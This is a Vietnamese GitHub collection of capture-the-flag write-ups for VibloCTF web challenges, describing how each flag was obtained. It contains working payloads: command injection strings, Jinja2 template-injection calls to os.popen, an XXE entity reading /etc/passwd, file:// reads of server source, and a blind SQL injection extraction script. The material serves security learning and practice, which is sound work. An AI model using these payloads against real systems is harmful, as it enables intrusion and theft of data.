# VibloCTF-Writeups
## Contents
### Web
- [Web7](https://github.com/DucThinh47/VibloCTF-Writeups#web7)
- [We're out of idea, let's call it Web2](https://github.com/DucThinh47/VibloCTF-Writeups/tree/main#were-out-of-idea-lets-call-it-web2)
- [Tricky Sneaky Weby](https://github.com/DucThinh47/VibloCTF-Writeups/tree/main#tricky-sneaky-weby)
- [Web11](https://github.com/DucThinh47/VibloCTF-Writeups#web11)
- [It's OT TIME!](https://github.com/DucThinh47/VibloCTF-Writeups/tree/main#its-ot-time)
- [Sun* Service](https://github.com/DucThinh47/VibloCTF-Writeups/tree/main#sun-service)
- [Web13](https://github.com/DucThinh47/VibloCTF-Writeups#web13)
- [Web6](https://github.com/DucThinh47/VibloCTF-Writeups#web6)
- [phpinfo.php](https://github.com/DucThinh47/VibloCTF-Writeups#phpinfophp)
- [Web5](https://github.com/DucThinh47/VibloCTF-Writeups#web5)
- [Login Form](https://github.com/DucThinh47/VibloCTF-Writeups#login-form)
- [MagiC PhP](https://github.com/DucThinh47/VibloCTF-Writeups#magic-php)
- [Enough PHP magic](https://github.com/DucThinh47/VibloCTF-Writeups#enough-php-magic)
- [Email Template](https://github.com/DucThinh47/VibloCTF-Writeups#email-template)
- [Amazing MD5](https://github.com/DucThinh47/VibloCTF-Writeups#amazing-md5)
- [Wrappers bypass]()
- [ping pong]()
#### Web7

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)

Tôi đã kiểm tra source code, cookie nhưng không tìm được gì. Thử truy cập `/robots.txt`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image1.png?raw=true)

=> Tìm được path `/index.abc`, tôi sẽ truy cập thử:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image2.png?raw=true)

Nội dung là một đoạn code PHP, phân tích qua có thể thấy:

- NUL byte injection (do ereg không binary-safe)
    - `ereg("^[a-zA-Z0-9]+$", $password)` sẽ dừng ở ký tự `NUL \0`
    - Có thể đưa chuỗi password có dạng: phần đầu chỉ chữ/số, sau đó chèn `\0`, rồi mới đến `^_^`
    - Kết quả:
        -   `ereg` chỉ nhìn thấy phần trước `\0` (toàn alphanumeric) => không vào báo lỗi
        - `strpos` thì binary-safe, nhìn thấy cả phần sau `\0` => tìm được `'^_^'` => in flag.

Tôi thử nhập `/?password=abc%00^_^` và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image3.png?raw=true)

#### We're out of idea, let's call it Web2

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image4.png?raw=true)

Thử thách này sẽ yêu cầu chuyển đủ số tiền mới lấy được flag. Ban đầu tài khoản chỉ có 10$, tôi gửi số tiền này đi và kiểm tra request:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image5.png?raw=true)

Trong request body có 2 tham số là `money` và `rescue`. Tôi thử thay đổi giá trị tham số `rescue` thành `none` và `money` thành `$299999998`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image6.png?raw=true)

=> Thành công. Tiếp theo chỉ việc gửi số tiền theo yêu cầu và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image7.png?raw=true)
#### Tricky Sneaky Weby

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image8.png?raw=true)

Mật khẩu của level 1 đã được cho sẵn là `SUN$HELL`, tuy nhiên khi xem source code, tôi thầy rằng dù nhập chữ hoa thì server sẽ luôn ép chuyển về chữ thường thông qua đoạn mã JS:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image9.png?raw=true)

Tôi đã Disable JS thông qua Devtool vừa vượt qua level 1:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image10.png?raw=true)

Sang level 2, mật khẩu đã bị lộ trong source code, được mã hóa dưới dạng base64:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image11.png?raw=true)

Giải mã, điền mật khẩu và tôi tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image12.png?raw=true)

Tuy nhiên, đây không phải flag thật, tôi tiếp tục tìm hiểu source code thì vẫn còn một thử thách nữa:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image13.png?raw=true)

Sang level tiếp theo, trong chuỗi mật khẩu có những khoảng trắng, đồng thời server không cho copy patse mật khẩu để dán vào. 

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image14.png?raw=true)

Tôi sử dụng console trong devtool và thực thi lệnh để lấy mật khẩu không chứa những ký tự khác:

    document.getElementById("password").innerText.replace(/[^\x20-\x7E]/g,"")

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image15.png?raw=true)

Sau đó sử dụng Burp Suite để gửi POST request và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image16.png?raw=true)
#### Web11

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image17.png?raw=true)

Kiểm tra source code, tôi tìm được path `/1.php`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image18.png?raw=true)

Truy cập trang này:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image19.png?raw=true)

Khi kiểm tra source code, tôi thấy nó hoàn toàn bị mã hóa, khi thử reload lại trang tôi thấy 1 ảnh khác được hiển thị rất nhanh xong lại biến mất, để ý kỹ thì bức ảnh này sẽ chứa flag.
#### It's OT TIME!

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image20.png?raw=true)

Thử click `View the source`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image21.png?raw=true)

Một đoạn code PHP, thông qua đoạn code này, tôi hiểu rằng mình phải truyền tham số `/?magic_command` với giá trị đúng bằng `HomNayOT_EmNhe` thì mới lấy được flag, tuy nhiên nếu nhập y nguyên thì server sẽ không chấp nhận. Do đó, tôi thử lồng chính chuỗi này vào chính nó `/? magic_command=HomNayOTHomNayOT_EmNhe_EmNhe` và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image22.png?raw=true)
#### Sun* Service

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image23.png?raw=true)

Là một trang web cho phép ping các domain được nhập. Tôi sẽ thử chèn thêm lệnh bằng cách nhập `google.com;id`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image24.png?raw=true)

=> Có thể lợi dụng lỗ hổng Command Injection, tiếp theo tôi thử chèn `;ls`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image25.png?raw=true)

Tìm được file `index.php`, tôi sẽ thử đọc nó bằng cách chèn `;cat index.php`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image26.png?raw=true)

Không đọc được, có thể bên server có filter, tôi thử bypass khoảng trắng bằng cách chèn `;tail${IFS}index.php` và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image27.png?raw=true)
#### Web13

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image28.png?raw=true)

Trang web cho phép nhập URL và trả về request header và request body khi gửi request đến URL đó:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image29.png?raw=true)

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image30.png?raw=true)

Tôi thử nhập `/etc/passwd` xem có in ra được nội dung không:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image31.png?raw=true)

Không in ra được, có thể website yêu cầu bắt buộc phải nhập vào một URL (phải bắt đầu bằng http://, https://,...), tôi nghĩ đến `URI scheme file://` để biến đường dẫn file cục bộ thành một URL hợp lệ:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image32.png?raw=true)

=> Thành công, tiếp theo tôi sẽ thử đọc nội dung file `index.php` bằng cách nhập: 

    file:///proc/self/cwd/index.php

Trong Linux có một cơ chế đặc biệt:
- `/proc/self/` là thư mục ảo chứa thông tin về chính tiến trình hiện tại.
- `/proc/self/cwd/` là một symlink (liên kết tượng trưng) trỏ tới current working directory (CWD) của tiến trình đó
- Với tiến trình PHP hoặc webserver, `cwd` thường chính là thư mục webroot (chứa `index.php`, `config.php`, …)
- Nội dung file `index.php:

        "<?php
        @error_reporting(E_ALL^E_NOTICE);
        @ini_set('display_errors', 1);
        include 'config.php';

        function unparse_url($parsed_url)
        {
        $scheme   = isset($parsed_url['scheme']) ? $parsed_url['scheme'] . '://' : '';
        $host     = isset($parsed_url['host']) ? $parsed_url['host'] : '';
        $port     = isset($parsed_url['port']) ? ':' . $parsed_url['port'] : '';
        $user     = isset($parsed_url['user']) ? $parsed_url['user'] : '';
        $pass     = isset($parsed_url['pass']) ? ':' . $parsed_url['pass']  : '';
        $pass     = ($user || $pass) ? "$pass@" : '';
        $path     = isset($parsed_url['path']) ? $parsed_url['path'] : '';
        $query    = isset($parsed_url['query']) ? '?' . $parsed_url['query'] : '';
        $fragment = isset($parsed_url['fragment']) ? '#' . $parsed_url['fragment'] : '';
        return "$scheme$user$pass$host$port$path$query$fragment";
        }

        function curl_get($url)
        {
        try {
            $url  = parse_url($url);
            if (!in_array($url['scheme'], ['file', 'http', 'https'])) return [];
            $url = unparse_url($url);
            $ch = curl_init();
            curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HEADER => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_MAXREDIRS => 1,
            CURLOPT_ENCODING => '',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding: gzip, deflate',
                'Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cache-Control: no-cache',
                'Connection: keep-alive',
                'DNT: 1',
                'Pragma: no-cache',
                'Referer: '.$url,
                'Sec-Fetch-Mode: navigate',
                'Sec-Fetch-Site: cross-site',
                'Sec-Fetch-User: ?1',
                'Upgrade-Insecure-Requests: 1',
                'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            ],
            ]);
            $raw = curl_exec($ch);
            $headers = '';
            $content = '';
            $rnrn = strpos($raw, "\r\n\r\n");
            if ($rnrn === false) {
            $headers = $raw;
            } else {
            $headers = substr($raw, 0, $rnrn);
            $content = substr($raw, $rnrn + 4);
            }
            $error = curl_error($ch);
            $info = curl_getinfo($ch);
            curl_close($ch);
            return [
            'raw' => $raw,
            'headers' => $headers,
            'content' => $content,
            'error' => $error,
            'info' => $info,
            ];
        } catch (Exception $e) {
            return [];
        }
        }
        if (isset($_POST['debug_url']) && isset($_POST['debug_field'])) {
        $info = curl_get($_POST['debug_url']);
        echo 'Here is your debug informations:<br/><pre>';
        if(isset($info['error']) && $info['error']) {
            echo 'Error: ',$info['error'], "\r\n\r\n";
        }
        var_dump(htmlentities($info[$_POST['debug_field']]));
        echo '</pre>';
        }
        ?>
        <h2>Debug your webhook</h2>
        <form method=post>
        <label>URL: <input name=debug_url placeholder="Debug URL" value="<?php echo htmlentities($_POST['debug_url']??''); ?>"></label>
        <br>
        <br>
        <label>  
        Field:
        <select name=debug_field>
            <option value="headers">HEADER</option>
            <option value="content" selected>BODY</option>
        </select>
        <br>
        <br>
        <button type=submit>DEBUG</button>
        </label>
        <br>
        <br>"
Không thu được gì từ `index.php`. Tiếp theo tôi thử đọc file hệ thống `config.php` và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image33.png?raw=true)
#### Web6

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image34.png?raw=true)

Tôi thử nhập `admin:admin`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image35.png?raw=true)

Tìm được một session cookie, tôi thử xem source code và tìm được đường dẫn để tải source code về:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image36.png?raw=true)

Sau khi tải, tôi tìm được file `run.py` có nội dung sau:

    from flask import Flask, render_template, session, request, redirect, url_for
    from functools import wraps

    app = Flask(__name__)
    app.secret_key = 'xxx'

    def login_required(function):
        @wraps(function)
        def wrap(*args, **kwargs):
            if (not 'username' in session) and (request.endpoint != 'login' and '/static/' not in request.path):
                return redirect(url_for('login'))
            else:
                return function(*args, **kwargs)
        return wrap

    @app.route('/login',methods=['GET','POST'])
    def login():
        if request.method == "GET":
            return render_template('login.html')
        else:
            username = request.form['u']
            password = request.form['p']
            if 's_username' not in session or 's_password' not in session:
                session['s_username'] = 'xxx'
                session['s_password'] = 'xxx'

            session['username'] = username
            session['password'] = password
            return redirect(url_for('index'))

    @app.route('/logout',methods=['GET','POST'])
    def logout():
        session.clear()
        return redirect(url_for('login'))

    @app.route('/',methods=['GET','POST'])
    @login_required
    def index():
        if 'username' in session:
            if session['username'] == session['s_username'] and session['password'] == session['s_password']:
                flag = 'xxx'
                return render_template('index.html',session=session,flag=flag)

        return render_template('index.html')

    if __name__ == '__main__':
        app.run(debug=True, host='0.0.0.0',port=5000)

Dựa vào đoạn code có thể thấy:
- Flag sẽ trả về nếu `username=s_username` và `password=s_password`
- `s_username` và `s_password` không lấy từ DB hay file gì cả => nó chỉ được set vào session lần đầu
- Tức là cả `s_username/s_password` và `username/password` đều cùng nằm trong session, và session lại được client giữ (Flask session cookie)
- Flask session dùng `app.secret_key ('xxx')` để sign dữ liệu session.
=> Nếu biết secret key, tôi có thể tự tạo một session cookie chứa `s_username=something`, `s_password=something`, `username=something`, `password=something` để bypass check và nhận flag

Tôi sẽ dùng `Flask-unsign` để brute-force secret key:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image37.png?raw=true)

Tuy nhiên lại tìm được cả `s_username` và `s_password`, tôi login bằng thông tin này và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image38.png?raw=true)
#### phpinfo.php

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image39.png?raw=true)

Đoạn code được cung cấp:

    <?php
    phpinfo();

    @extract($_REQUEST);

    eval(
        "\x65\x76\x61\x6C\x28" .
        "\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65" .
        "\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65" .
        "\x28'TZFJk6JAFIT/S196JurQrAXEnNgVQQQFxPACxaIgNItgWb++6bEjZg4ZGZn5vdPL5+T26+2MIX/GAlycXqSeMSMuLiydvLi0SF8EX9s3I3Cvm78c89Oxr45dOHbZeWPJPxz83v7LjPiOT4qdcpZsrI8fVzynYRjA3mxgbKoPZ7P2T6tKJ4HccSVRabkoByDFh6wzJJpB7RaTuZsR62IHBNuZgl1JcXwIA6crMte17vbKubv1AUbebTUMw0g4kKaExOzUHG3bcOpuLPOmdQHKJxqQZGuxYHZVKKYMztppPnlRtMV4LPQE40qYR+gCg2VwYXdrObF63tTrq7bfirwrTmV1uwxqRa5Uu9IiREq5WBn38XEIS87JdPOxB3l/p0qJoJhXHBwbNq8EaZjxADLPmo20gF1rGvhMg8FJjcAikNa5vBOSW4P46UrbT4A+6qsyo/wo7KSc9wBXEM3qL+qI/F5IdNWlePNgMVCqPq2Gnjo/kTac3zoeB+lJlr1WdUsfPL0Y5UC0dpoW13QSbU6w9vwyfR6yhqb6xFRaFIYVDVDNy+b8idtaHp2yj9HFdVjW8htz3Y7QKbL9Pu2bqN9J4MTN78tHpX9ilbfff74A'" .
        "\x29\x29\x29\x3B"
    );

    echo($It($works));
    ?>

Dựa vào đoạn code này, có thể thấy:
- Biến `$It` và `$works` đều được lấy từ tham số request (GET hoặc POST) nhờ `extract($_REQUEST)`
- Cuối cùng nó gọi hàm `$It($works)`

=> `$It` phải là tên hàm có tồn tại trong PHP (ví dụ: system, assert, base64_decode,…) và `$works` là tham số truyền vào cho hàm đó.

Tôi thử dùng `dirsearch` và tìm được URL `/phpinfo.php`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image40.png?raw=true)

Tiếp theo tôi thử truy cập `/phpinfo.php?It=system&works=whoami`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image41.png?raw=true)

=> Thành công thực hiện câu lệnh `whoami`. Tiếp theo tôi thử chèn lệnh `ls` và tìm được 1 file khả nghi:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image42.png?raw=true)

Tiến hành đọc file này và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image43.png?raw=true)
#### Web5

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image44.png?raw=true)

Sau khi thử một loạt các cách khai thác thì tôi tìm được trang web bị dính lỗ hổng SSTI, sử dụng template Jinja2, cụ thể khi tôi chèn payload `{{7*7}}` vào URL thì website trả về như sau:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image45.png?raw=true)

Tiếp theo tôi chèn payload:

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name *.txt').read() }}

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image46.png?raw=true)

Tìm được file là `/src/_uh_oh_what_is_this_file.txt`, thử đọc nội dung file này và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image47.png?raw=true)
#### Login Form

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image48.png?raw=true)

Là một trang login, khi tôi thử nhập username là `admin' ' OR '1'='1` và password random thì website trả về như sau:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image49.png?raw=true)

Thông báo cho thấy flag chính là mật khẩu của username `flag`. Như vậy, tôi sẽ phải tìm ra mật khẩu của user này. 

Tôi đã nhờ chat gpt viết một đoạn code:

    import requests
    import string
    import time

    URL = "http://172.104.49.143:1323/"
    SUCCESS_TEXT = "Success"

    # Charset thường dùng trong flag CTF
    CHARSET = string.ascii_letters + string.digits + "{}_"

    def go(payload, retries=3):
        """Gửi request với retry khi bị lỗi kết nối"""
        for _ in range(retries):
            try:
                r = requests.post(URL, data=payload, timeout=10)
                return r.text
            except requests.exceptions.RequestException:
                print("[!] Connection error, retrying...")
                time.sleep(2)
        return ""

    print("[*] Get length of password")
    length = 0
    for i in range(1, 100):
        payload = {
            "login": "",
            "username": f"flag' AND LENGTH(password)={i}-- -",
            "password": "123"
        }
        ans = go(payload)
        if SUCCESS_TEXT in ans:
            length = i
            print(f"[+] Password length: {length}")
            break

    print("\n[*] Get password")

    # Resume nếu cần (ví dụ đã brute được "Flag{bl1nd_sql")
    password = ""

    for pos in range(len(password) + 1, length + 1):  # vị trí ký tự bắt đầu từ 1
        found = False
        for ch in CHARSET:
            payload = {
                "login": "",
                "username": f"flag' AND BINARY SUBSTRING(password,{pos},1)='{ch}'-- -",
                "password": "123"
            }
            ans = go(payload)
            if SUCCESS_TEXT in ans:
                password += ch
                print(f"[+] Position {pos}: {password}")
                found = True
                break
            time.sleep(0.2)  # delay nhỏ để tránh bị chặn
        if not found:
            print(f"[!] Cannot find char at position {pos}, stopping.")
            break

    print("\n[+] Final extracted password:", password)

Cuối cùng tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image50.png?raw=true)
#### MagiC PhP

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image51.png?raw=true)

Xem source code và tôi tìm được path `index.phps`, truy cập thì ra một đoạn mã php:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image52.png?raw=true)

Qua đoạn code, có thể thấy server so sánh chuỗi `crc32_string($value)` với `crc32_string('ecTmZcC')` bằng `==` (không phải ===).

`crc32_string('ecTmZcC')` cho ra hex: `0e730435`. Chuỗi dạng `0e\d+` trông giống số khoa học “0 × 10^…”, nên khi so sánh bằng `==`, PHP sẽ ép cả hai về số `0` => coi là bằng nhau, dù CRC32 thật sự khác.

=> Tôi chỉ cần nhập bất kỳ giá trị nào sao cho `crc32(value)` (dưới dạng hex 8 ký tự) có dạng `0e + toàn chữ số`. Ví dụ:
- value = `Xe` => crc32_hex = 0e635074
- value = `bN`c => crc32_hex = 0e539435
- value = `fFU` => crc32_hex = 0e392378

Các giá trị này:
- Khác chuỗi `"ecTmZcC"` => qua được điều kiện `$value !== "ecTmZcC"`
- Nhưng khi so sánh `crc32_string($value) == crc32_string('ecTmZcC')`, PHP coi "0e635074" == "0e730435" là đúng (cùng = 0 về mặt số học)

Tôi thử nhập `Xe` và tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image53.png?raw=true)
#### Enough PHP magic

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image54.png?raw=true)

Tôi phải tìm và nhập đúng secret thì mới trả về flag. Dùng `dirsearch` scan website, tôi tìm được path đến `/index.phps`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image55.png?raw=true)

=> Đoạn code thu được: 

    <?php
            $filename = 'xxxxxxxx.txt';
            extract($_GET);
            if (isset($attempt)) {
                $combination = trim(file_get_contents($filename));
                if ($attempt === $combination) {
                    $flag = file_get_contents('xxxxxxxx.txt');
                    echo "<p>You win! The flag is:"."$flag</p>";
                } else {
                    echo "<p>Wrong! The secret not is <strong>$attempt</strong></p>";
                }
            }
    ?>

Phân tích đoạn code có thể thấy:
- Mặc định: `$filename = 'xxxxxxxx.txt'`
- Nhưng lại có `extract($_GET)` => nghĩa là mọi param đưa vào URL sẽ override biến PHP có sẵn

Như vậy, nếu tôi thêm tham số vào URL: `?filename=&attempt`:
- `filename=` => gán `$filename = ""`
- Tham số `attempt` không có giá trị nào, nhưng vì chỉ cần `isset($attempt)` nên biến `$attempt` tồn tại (dù rỗng)

Lúc này:

    $combination = trim(file_get_contents($filename)); 

=> `file_get_contents("")` => lỗi / trả về `false` 
=> `$combination = ""` (sau khi trim)

So sánh:

    if ($attempt === $combination) { ... }

Mà `$attemp` cũng đang rỗng => điều kiện true

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image56.png?raw=true)
#### Email Template

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image57.png?raw=true)

Đăng nhập vào tài khoản `user1:user1` được cung cấp sẵn:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image58.png?raw=true)

Tôi nhận được JWT token của `user1`, sau khi sử dụng tool, tôi tìm ra được secret key là `secret`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image59.png?raw=true)

Từ đó tôi tạo ra được JWT token mới cho `admin` và sử dụng được tính năng Edit template:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image60.png?raw=true)

Tôi thử nhập `Subject` là `Jinja2` và `Body` là `{{7*7}}`:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image61.png?raw=true)

Khi click vào `Test layout content`, response từ server cho thấy website có thể dính lỗ hổng SSTI:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image62.png?raw=true)

Tiếp theo tôi nhập vào `Body` payload đọc file `flag.py`:

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('tail flag.py').read() }}

Flag được trả về:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image63.png?raw=true)
#### Amazing MD5

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image64.png?raw=true)

Dựa vào đoạn code này, tôi nghĩ đến lỗ hổng MD5 Collision, tôi sẽ gửi POST request, kèm theo tham số `a` và `b` trong body. Giá trị của 2 tham số này phải khác nhau nhưng lại có chung một giá trị MD5 hash. Tôi tìm được 2 giá trị là `240610708` và `QNKCDZO`, gửi request và tôi tìm được flag:

![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image65.png?raw=true)
#### Wrappers bypass

![img](66)

Thử click vào `click me?no`:

![img](67)

Có thể thấy tham số `file` có giá trị là `show.php` được thêm vào query. Dựa vào tên thử thách: `Wrappers bypass`, tôi nghĩ đến `wrapper php://filter` - một stream wrapper đặc biệt trong PHP, cho phép áp dụng các bộ lọc lên file trước khi đưa cho PHP xử lý.

Nếu tôi thay giá trị của `file` thành `php://filter/convert.base64-encode/resource=index.php`, thì filter ở đây là `convert.base64-encode`, nghĩa là thay vì thực thi code trong `index.php`, PHP sẽ đọc toàn bộ file `index.php`, encode nó thành base64, rồi trả thẳng về output:

![img](68)

Decode chuỗi base64 này, output là nội dung file `index.php` kèm theo flag:

![img](69)
#### ping pong

![img](70)

Tôi thử nhập `admin:admin`, request `/doLogin` và response có dạng như sau:

![img](71)

Tôi nghĩ đến lỗ hổng `XXE Injection`, tìm kiếm payload, tôi sẽ thử gửi request `/doLogin` với phần body như sau:

    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <user>
    <username>&xxe;</username>
    <password>123</password>
    </user>

![img](72)

=> Thành công trả về nội dung `/etc/passwd`. Tiếp theo tôi thử gửi payload để đọc nội dung file `/proc/self/cwd/app.py`:

![img](73)

=> Tìm được tài khoản mật khẩu để login `Sup3rS3cr3t@dminUs3rN@m3:Sup3rS3cr3tP@ssW0rd@dmin`:

![img](74)

=> Vào được trang `/admin`, click `Ping`:

![img](75)

Trang `/ping` này dính lỗ hổng Command Injection, chèn payload và tôi đọc được flag:

![img](76)










